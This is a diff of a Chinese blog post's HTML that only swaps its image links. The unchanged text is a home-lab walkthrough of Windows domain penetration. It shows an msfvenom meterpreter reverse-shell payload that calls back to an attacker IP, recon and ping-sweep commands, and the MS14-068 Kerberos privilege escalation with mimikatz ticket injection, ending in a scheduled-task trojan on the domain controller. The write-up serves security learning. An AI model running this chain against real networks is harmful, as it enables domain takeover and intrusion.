@@ -56,14 +56,14 @@ ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = {
 </ul>
 <p>可以看：<a href="http://support.huawei.com/enterprise/docinforeader!loadDocument1.action?contentId=DOC1000061342&amp;partNo=10062#os_cfg_ads_0029" target="_blank" rel="noopener">搭建AD域环境</a></p>
 <p>创建用户</p>
-<p><img src="https://i.loli.net/2018/08/11/5b6e9aeeaa2c5.png" alt="s9.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Windows-domain.assets/5b6e9aeeaa2c5.png" alt="s9.png"></p>
 <p>win7加入域</p>
-<p><img src="https://i.loli.net/2018/08/11/5b6e9aeeab37b.png" alt="s1.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Windows-domain.assets/5b6e9aeeab37b.png" alt="s1.png"></p>
 <p><strong>DNS要设置为域控的IP</strong>，否则会出现网络路径错误</p>
-<p><img src="https://i.loli.net/2018/08/11/5b6e9aee3d693.png" alt="s2.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Windows-domain.assets/5b6e9aee3d693.png" alt="s2.png"></p>
 <p>这是会重启，开机<strong>切换用户</strong>来登陆域</p>
-<p><img src="https://i.loli.net/2018/08/11/5b6e9aeeb0f7e.png" alt="s3.png"></p>
-<p><img src="https://i.loli.net/2018/08/11/5b6e9aee72856.png" alt="s7.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Windows-domain.assets/5b6e9aeeb0f7e.png" alt="s3.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Windows-domain.assets/5b6e9aee72856.png" alt="s7.png"></p>
 <h4 id="域环境结构"><a href="#域环境结构" class="headerlink" title="域环境结构"></a>域环境结构</h4><p>域：TEST.com</p>
 <p>域控：windows server 2003 r2，ip：10.211.55.26</p>
 <p>域成员：windows 7 x64，ip：10.211.55.19</p>
@@ -74,9 +74,9 @@ ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = {
 </ul>
 <p>生成反弹马（这里我win7没有管理员权限，启动不了web服务，遂用exe的）</p>
 <p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.211.201 LPORT=7777 -f exe &gt; ./Desktop/re.exe</code></p>
-<p><img src="https://i.loli.net/2018/08/11/5b6ebd928dda7.png" alt="s10.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Windows-domain.assets/5b6ebd928dda7.png" alt="s10.png"></p>
 <p>msfconsole设置监听并启动</p>
-<p><img src="https://i.loli.net/2018/08/11/5b6ebde419856.png" alt="s11.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Windows-domain.assets/5b6ebde419856.png" alt="s11.png"></p>
 <p>输入shell进入控制台，因为win7是中文控制台，会有乱码</p>
 <h5 id="常用信息收集命令："><a href="#常用信息收集命令：" class="headerlink" title="常用信息收集命令："></a>常用信息收集命令：</h5><p><code>echo %PROCESSOR_ARCHITECTURE%</code> //查看系统版本位数</p>
 <p><code>netstat -ano</code> //查看开放的端口</p>
@@ -100,7 +100,7 @@ ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = {
 <p><code>nbtstat</code><br>//由IP地址得到机器名</p>
 <p>ping 扫描内网存活主机：</p>
 <p><code>for /l %i in (1,1,255) do @ping 192.168.200.%i -w 1 -n 1 | find /i&quot;ttl&quot;</code></p>
-<p><img src="https://i.loli.net/2018/08/11/5b6ec46303442.png" alt="s13.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Windows-domain.assets/5b6ec46303442.png" alt="s13.png"></p>
 <p>查看是否支持PowerShell：<br><code>if defined PSModulePath (echo support powershell) else (echo not support powershell)</code></p>
 <p>比较全的查询命令：<a href="http://b404.xyz/2017/12/30/exploit-domain/" target="_blank" rel="noopener">域渗透的整理</a></p>
 <h4 id="MS14-068漏洞复现"><a href="#MS14-068漏洞复现" class="headerlink" title="MS14-068漏洞复现"></a>MS14-068漏洞复现</h4><p>这个漏洞允许黑客提升任意普通用户权限成为域管理员（Domain Admin）身份。</p>
@@ -110,20 +110,20 @@ ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = {
 <p>Kerberos协议是一种基于第三方可信主机的计算机网络协议，它允许两个实体之间在非安全网络环境（可能被窃听、被重放攻击）下以一种安全的方式证明自己的身份。</p>
 </blockquote>
 <p><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068" target="_blank" rel="noopener">工具</a></p>
-<p>域控地址<br><img src="https://i.loli.net/2018/08/11/5b6ed42422191.png" alt="s15.png"></p>
-<p>用户名与SID<br><img src="https://i.loli.net/2018/08/11/5b6ed42423924.png" alt="s16.png"></p>
+<p>域控地址<br><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Windows-domain.assets/5b6ed42422191.png" alt="s15.png"></p>
+<p>用户名与SID<br><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Windows-domain.assets/5b6ed42423924.png" alt="s16.png"></p>
 <p>获取TGT并清除缓存票据<br><code>MS14-068.exe -u win7@test.com -p Abcdefg123 -s S-1-5-21-2778320292-2955838337-2508653396-1106 -d xc5ca8.test.com</code></p>
-<p><img src="https://i.loli.net/2018/08/11/5b6ed4ba34466.png" alt="s14.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Windows-domain.assets/5b6ed4ba34466.png" alt="s14.png"></p>
 <p>注入TGT<br><code>mimikatz.exe &quot;kerberos::ptc TGT_win7@test.com.ccache&quot; exit</code></p>
-<p><img src="https://i.loli.net/2018/08/11/5b6ed509efe02.png" alt="s17.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Windows-domain.assets/5b6ed509efe02.png" alt="s17.png"></p>
 <p><a href="mailto:`TGT_win7@test.com.ccache" target="_blank" rel="noopener">`TGT_win7@test.com.ccache</a>`是个文件，会在本地生成，注意此文件的路径（被坑了半天才发现）</p>
-<p>缓存票据发生变化<br><img src="https://i.loli.net/2018/08/11/5b6ed587618a8.png" alt="s18.png"></p>
-<p>访问域控xc5ca8的资源<br><img src="https://i.loli.net/2018/08/11/5b6ed5a34567f.png" alt="s19.png"></p>
+<p>缓存票据发生变化<br><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Windows-domain.assets/5b6ed587618a8.png" alt="s18.png"></p>
+<p>访问域控xc5ca8的资源<br><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Windows-domain.assets/5b6ed5a34567f.png" alt="s19.png"></p>
 <p>这时可以传马反弹shell</p>
 <p>copy完后添加计划任务，等待反弹</p>
-<p><img src="https://i.loli.net/2018/08/12/5b6fd98c3c519.png" alt="s20.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Windows-domain.assets/5b6fd98c3c519.png" alt="s20.png"></p>
 <p>成功获取域控的system权限</p>
-<p><img src="https://i.loli.net/2018/08/12/5b6fd98c91a09.png" alt="s21.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Windows-domain.assets/5b6fd98c91a09.png" alt="s21.png"></p>
 </div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">J0k3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://j0k3r.top/2018/08/15/Windows-domain/">http://j0k3r.top/2018/08/15/Windows-domain/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://j0k3r.top">J0k3r's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Windows/">Windows</a><a class="post-meta__tags" href="/tags/内网渗透/">内网渗透</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/alipay.jpg"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/wechat.jpg"><div class="post-qr-code__desc">微信打赏</div></div></div><div class="social-share"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/09/26/ctfs_18_9/"><i class="fa fa-chevron-left">  </i><span>部分 noxCTF &amp; hackitctf WriteUp</span></a></div><div class="next-post pull-right"><a href="/2018/08/12/FJssti/"><span>Flask/Jinja2服务端模版注入</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
 var verify = 'true' == true ? true : false;
 var GUEST_INFO = ['nick','mail','link'];
